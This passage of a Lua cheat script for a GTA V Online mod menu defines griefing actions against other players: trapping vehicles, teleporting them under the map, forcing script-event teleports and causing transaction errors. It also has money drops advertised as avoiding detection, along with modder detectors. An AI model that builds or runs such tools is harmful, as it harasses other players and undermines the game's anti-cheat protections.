            local spawnedfloorbr = entities.create_object(floorbr, c)
            c.z = c.z + 10
            local spawnedroofbr = entities.create_object(floorbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedroofbr, 180.0, 0.0, 0.0, 1, true)

            defz = c.z - 5
            c.x = c.x + 4
            c.z = defz
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 8
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 8
            c.x = defx + 10.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7.2
            c.x = defx + 3.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy + 6.5
            c.x = defx + 11
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = defx - 12
            c.y = defy + 4
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 10
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy - 10
            c.x = defx - 19
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = defx - 3
            c.y = defy + 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = defx + 25
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x + 7
            c.y = defy
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y - 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 7.5
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 3.1
            c.x = c.x + 5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            util.yield(600)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
            util.yield(500)
            entities.delete_by_handle(veh)
        else
            util.toast(players.get_name(player_id).. " No esta en un vehiculo")
        end
    end)

    menu.action(trolling, "DDoS", {}, "You DDoS them uwu", function()
        util.toast("A DDoS attack has been sent to " ..players.get_name(player_id))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(3000)
        util.toast("Just kidding, what the fuck did you think was gonna happen?")
    end)

    menu.action(friendly, "Fix loading screen", {}, "It will fix the infinite loading screen.", function()
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        menu.trigger_commands("aptme" .. players.get_name(player_id))
    end)

    menu.action(friendly, "Give level", {}, "Gain/give RP to level up. \nPosible crash.", function()
        menu.trigger_commands("givecollectibles" .. players.get_name(player_id))
    end)

    menu.action(friendly, "Gain criminal damage", {}, "Make them win the criminal damage online challenge", function()
        local fcartable = {}

        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local defz = c.z
        STREAMING.REQUEST_MODEL(expcar)
        while not STREAMING.HAS_MODEL_LOADED(expcar) do
            STREAMING.REQUEST_MODEL(expcar)
            util.yield()
        end
        STREAMING.REQUEST_MODEL(floorbr)
        while not STREAMING.HAS_MODEL_LOADED(floorbr) do
            STREAMING.REQUEST_MODEL(floorbr)
            util.yield()
        end
        local success, floorcoords
        repeat
            success, floorcoords = util.get_ground_z(c.x, c.y)
            util.yield()
        until success
        floorcoords = floorcoords - 100
        c.z = floorcoords
        local floorrigp = entities.create_object(floorbr, c)
        c.z = defz
        c.z = c.z - 95 
        for i = 1, 22 do
            fcartable[#fcartable + 1] = entities.create_vehicle(expcar, c, 0) 
        end
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(p, c.x, c.y, floorcoords, exp, 100.0, true, false, 1.0) 
        util.yield(500)
        entities.delete_by_handle(floorrigp)
        util.yield(1000)
        
        for i = 1, #fcartable do
            entities.delete_by_handle(fcartable[i]) 
            fcartable[i] = nil
        end
    end)

    menu.action(friendly, "Give health and armor", {}, "", function()
        menu.trigger_commands("autoheal"..players.get_name(player_id))
    end)

    menu.toggle_loop(friendly, "Silent godmode", {}, "Free mod menus won't detect this", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(ped), true, true, true, true, true, false, false, true)
        end, function() 
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(ped), false, false, false, false, false, false, false, false)
    end)

    menu.toggle_loop(friendly, "Give casino chips", {"dropchips"}, "This was tested for 3 weeks and looks safe, however it can be detected anytime", function(toggle)
        local coords = players.get_position(player_id)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("vw_prop_vw_lux_card_01a")
        STREAMING.REQUEST_MODEL(card)
        if STREAMING.HAS_MODEL_LOADED(card) == false then  
            STREAMING.REQUEST_MODEL(card)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
    end)

    menu.toggle(friendly, "Money Drop", {}, "Literally money drop, the one we all know. \nTHIS WASN'T TESTED, WE'RE NOT RESPONSIBLE FOR ANY BANS.", function(on_toggle)
        local coords = players.get_position(player_id)
        coords.z = coords.z + 1.5
        if on_toggle then
            util.yield(50)
            menu.trigger_commands("ceopay".. players.get_name(player_id))
            menu.trigger_commands("rp".. players.get_name(player_id))
            menu.trigger_commands("cards".. players.get_name(player_id))
        else
            util.yield(50)
            menu.trigger_commands("ceopay".. players.get_name(player_id))
            menu.trigger_commands("rp".. players.get_name(player_id))
            menu.trigger_commands("cards".. players.get_name(player_id))
        end
    end)

    menu.toggle_loop(friendly, "Gain checkpoints", {}, "Make them win the checkpoint online challenge", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        if PED.IS_PED_IN_ANY_VEHICLE(p) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
            RequestControl(veh)
            local dblip = HUD.GET_NEXT_BLIP_INFO_ID(431)
            local cdblip = HUD.GET_BLIP_COORDS(dblip)
            ENTITY.SET_ENTITY_COORDS(veh, cdblip.x, cdblip.y, cdblip.z, false, false, false, false)
            util.yield(1500)
        else
            util.toast(players.get_name(player_id).. " Has to be in a vehicle")
        end
    end)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- Vehicle


    menu.action(vehicle, "Repair vehicle", {}, "You repair their vehicle", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
            util.toast(players.get_name(player_id) .. " Vehicle repaired")
        else
            VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
        end
    end)

    local desv = menu.list(vehicle, "Disable vehicles.", {}, "")

    menu.action(desv, "Disable vehicles", {}, "Better than Stand's one", function(toggle)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
    end)

    menu.action(desv, "Disable vehicles V2", {}, "Unblockable because of Stand", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        local is_running = VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(player_vehicle)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(player_vehicle, -10.0)
            util.toast(players.get_name(player_id) .. " Motor jodido")
        else
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(player_vehicle, -10.0)
        end
    end)

    menu.toggle_loop(desv, "Disable vehicle loop", {}, "Better than Stand's one", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
    end)

    local modv = menu.list(vehicle, "Modify vehicle.", {}, "")

    menu.action(modv, "Random upgrades", {}, "It'll apply some random upgrades.", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        local ped = PLAYER.GET_PLAYER_PED(players.user())
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false) 
        menu.trigger_commands("tp"..players.get_name(player_id))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("godmode on")
        util.yield(4000)
        if ENTITY.DOES_ENTITY_EXIST(veh) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            local getm = VEHICLE.GET_NUM_VEHICLE_MODS(veh)
            for i = 0, 70 do
                VEHICLE.SET_VEHICLE_MOD(veh, i, getm, -1, false)

            end
        else
            util.toast("An error occured tryinh to obtain control over the vehicle.")
        end
        util.yield(500)
        menu.trigger_commands("tp"..players.get_name(player_id))
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("godmode off")
        ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, 1, false)
    end)

    menu.toggle(modv, "Random upgrades (Loop)", {}, "It'll apply some random upgrades.", function(on)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        local ped = PLAYER.GET_PLAYER_PED(players.user())
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false) 
        if on then
            menu.trigger_commands("invisibility on")
            menu.trigger_commands("godmode on")
            util.yield(200)
            menu.trigger_commands("tp"..players.get_name(player_id))
            util.yield(4000)
            if ENTITY.DOES_ENTITY_EXIST(veh) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                local getm = VEHICLE.GET_NUM_VEHICLE_MODS(veh)
                for i = 0, 70 do
                    VEHICLE.SET_VEHICLE_MOD(veh, i, getm, -1, false)
    
                end
            else
                util.toast("An error occured tryinh to obtain control over the vehicle.")
            end
        else
            menu.trigger_commands("tp"..players.get_name(player_id))
            menu.trigger_commands("invisibility off")
            menu.trigger_commands("godmode off")
            ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, 1, false)
        end
    end)

    menu.toggle(modv, "Pushed by sound", {}, "You'll push people when using the vehicle's horn.", function()
        local player = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        if AUDIO.IS_HORN_ACTIVE(player_vehicle) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 10000, 0.0, true, true, true, true)
        end
    end)

    menu.toggle(modv, "Jump by sound", {}, "Everything will jump when using the vehicle's horn.", function()
        local player = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        if AUDIO.IS_HORN_ACTIVE(player_vehicle) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 0.0, 10000, true, true, true, true)
        end
    end)
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    -- Other

    local sevents = menu.list(otherc, "Events", {}, "Script created events.")

    local tps = menu.list(sevents, "Tp's", {}, "Player teleport events.") 
    
    menu.action(tps, "Cayo Perico", {}, "Blocked by most of the menus.", function()
        util.trigger_script_event(1 << player_id, {1669592503, player_id, 0, 0, 3, 1})
    end)

    menu.action(tps, "Cayo Perico v2", {}, "Blocked by most of the menus.", function()
        util.trigger_script_event(1 << player_id, {1669592503, player_id, 0, 0, 4, 0})
    end)

    local fuckrs = menu.list(sevents, "Breakers", {}, "Annoying events.")

    menu.action(fuckrs, "Transaction errors", {}, "Kinda inconsistent but it works well.", function()
        if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_destroy_veh")) == 0 then
            util.request_script_host("freemode")
            while players.get_script_host() ~= players.user() do util.yield_once() end
            local sscript = menu.ref_by_path("Online>Session>Session Scripts>Run Script>Removed Freemode Activities>Destroy Vehicle")
            menu.trigger_command(sscript)
            while SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_destroy_veh")) == 0 do
                util.yield(1000)
            end
        end
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(225) == 0 and 348 or 225
        local coords = get_blip_coords(blip)
        local explodeTargetVeh = function()
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
            local handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
            local oldPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
            ENTITY.SET_ENTITY_COORDS(handle, coords.x, coords.y + 20, coords.z, false, false, false, false)
            util.yield(1000)
            coords = get_blip_coords(blip)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), coords.x, coords.y, coords.z, 4, 50, false, true, 0.0)
            handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS(handle, oldPos.x, oldPos.y, oldPos.z, false, false, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), coords.x, coords.y, coords.z, 4, 50, false, true, 0.0)
        end
        if coords.x ~= 0 and coords.y ~= 0 and coords.z ~= 0 then
            explodeTargetVeh()
        else
            util.yield(2500)
            coords = get_blip_coords(blip)
            while coords.x == 0 do
                coords = get_blip_coords(blip)
                util.yield_once()
            end
            explodeTargetVeh()
        end
    end)
    
    menu.action(fuckrs, "Send em to hell", {}, "You tp them out of the map specifically undermap. \nThey'll need to be in a vehicle in order for it to work.", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        c.z = c.z - 100
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            RequestControl(veh)
            floorcoords = floorcoords - 50
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, floorcoords, false, false, false, false) --tp undermap
        else
            util.toast(players.get_name(player_id).. " is not inside a vehicle.")
        end
    end)

    menu.action(otherc, "Players waypoint", {}, "It should show you the players current waypoint.", function()    
        local playerw = players.get_waypoint(player_id)
        for i = 1, 5 do
            HUD.REFRESH_WAYPOINT()
        end
        HUD.SET_NEW_WAYPOINT(playerw, playerw, false)
        util.yield(2000)
        util.toast("The player's waypoint should already be marked in the map.")
        util.yield(500)
        util.toast("Maybe he doesn't have one currently.")
    end)

    menu.toggle(otherc, "Spectate automatically", {}, "It'll use a method depending its state.", function(on)
        local spec_2 = menu.ref_by_rel_path(menu.player_root(player_id), "Spectate>Nuts Method")
        local spec_1 = menu.ref_by_rel_path(menu.player_root(player_id), "Spectate>Legit Method")
        if on then
            if ryze.get_interior_player_is_in(player_id) == 0 then
                spec_1.value = false
                spec_2.value = true
            else
                spec_2.value = false
                spec_1.value = true
            end 
        else 
            menu.trigger_commands("stopspectating")
        end 

    end)

    menu.toggle_loop(otherc, "ESP", {}, "Crea una linea recta hacia ellos.", function()
        local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local j = ENTITY.GET_ENTITY_COORDS(p)
        GRAPHICS.DRAW_LINE(c.x, c.y, c.z, j.x, j.y, j.z, 255, 255, 255, 255)
    end)
        
end)

cleansense = menu.list(world, "Cleaning options", {}, "")

menu.action(cleansense, "Clean world", {"rclearworld"}, "Literally cleans everything in the area including peds, vehicles, objects, bools etc.", function(on_click)
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local temp = memory.alloc(4)
    for i = 1, 100 do
        memory.write_int(temp, i)
        PHYSICS.DELETE_ROPE(temp)
        util.yield()
        MISC.CLEAR_AREA_OF_PROJECTILES(coords.x, coords.y, coords.z, 400, 0)
    end
    util.yield(500)
    clear_area(1000000)
    util.toast('World cleaned :3')
end)

menu.slider(cleansense, "Cleaning radius", {}, "Radius to clean", 100, 10000, 100, 100, function(s)
    radius = s
end)

menu.toggle_loop(world, "Upgrade the Anti-restriction", {}, "Upgrades the anti-restriction of Stand, you can jump on interior grounds.", function()
    if not PAD.IS_CONTROL_ENABLED(0, 22) and not menu.command_box_is_open() then
        if PAD.IS_DISABLED_CONTROL_JUST_PRESSED(0, 22) then
            MISC.SET_FORCED_JUMP_THIS_FRAME(players.user())
        end
    end
end)

menu.toggle(world, "No traffic", {}, "It will get rid of the peds on vehicles all over the world. \nNetWorked", function(toggle)
    local pop_multiplier_id
    if toggle then
        local ped_sphere, traffic_sphere
        if ryze.disable_peds then ped_sphere = 0.0 else ped_sphere = 1.0 end
        if ryze.disable_traffic then traffic_sphere = 0.0 else traffic_sphere = 1.0 end
        pop_multiplier_id = MISC.ADD_POP_MULTIPLIER_SPHERE(1.1, 1.1, 1.1, 15000.0, ped_sphere, traffic_sphere, false, true)
        MISC.CLEAR_AREA(1.1, 1.1, 1.1, 19999.9, true, false, false, true)
    else
        MISC.REMOVE_POP_MULTIPLIER_SPHERE(pop_multiplier_id, false);
    end
end)

menu.toggle_loop(world, "Disable horn", {}, "Disables all the vehicles horns around you.", function()
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        AUDIO.SET_HORN_ENABLED(vehicle, false)
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
--Detecciones

normalmod = menu.list(detections, "Normal Modders", {}, "")

menu.toggle_loop(normalmod, "GodMode", {}, "It'll pop up if godmode is detected.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if players.is_godmode(player_id) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and ryze.get_spawn_state(player_id) == 99 and ryze.get_interior_player_is_in(player_id) == interior then
                util.draw_debug_text(players.get_name(player_id) .. " Has godmode.")
                break
            end
        end
    end 
end)

menu.toggle_loop(normalmod, "Vehicle godmode", {}, "It'll pop up if godmode on a vehicle is detected.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and ryze.get_spawn_state(player_id) == 99 and ryze.get_interior_player_is_in(player_id) == interior then
                    util.draw_debug_text(players.get_name(player_id) .. " Is inside a vehicle with godmode")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(normalmod, "Modded weapons", {}, "It'll pop up if a gifted weapon is detected", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        for i, hash in ipairs(ryze.modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.toast(players.get_name(player_id) .. " Is using a modded gun")
                break
            end
        end
    end
end)

menu.toggle_loop(normalmod, "Unreleased Vehicle", {}, "It'll pop up if a unreleased vehicle is being used.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(player_id)
        for i, name in ipairs(ryze.modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(player_id) .. " Has a modded/unreleased vehicle")
                break
            end
        end
    end
end)

menu.toggle_loop(normalmod, "Weapon on interior grounds", {}, "It'll pop up if a weapon is being used on interior grounds", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if players.is_in_interior(player_id) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(player_id) .. " Has a weapon out on interior grounds")
            break
        end
    end
end)

menu.toggle_loop(normalmod, "Run fast", {}, "It'll pop up if a player is running faster than usual", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
        if not util.is_session_transition_active() and ryze.get_interior_player_is_in(player_id) == 0 and ryze.get_transition_state(player_id) ~= 0 and not PED.IS_PED_DEAD_OR_DYING(ped) 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 300.0 and ped_speed > 30 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
            util.toast(players.get_name(player_id) .. " Is Using Super Run")
            break
        end
    end
end)

menu.toggle_loop(normalmod, "Noclip", {}, "Detects if the player is levitating", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(player_id)
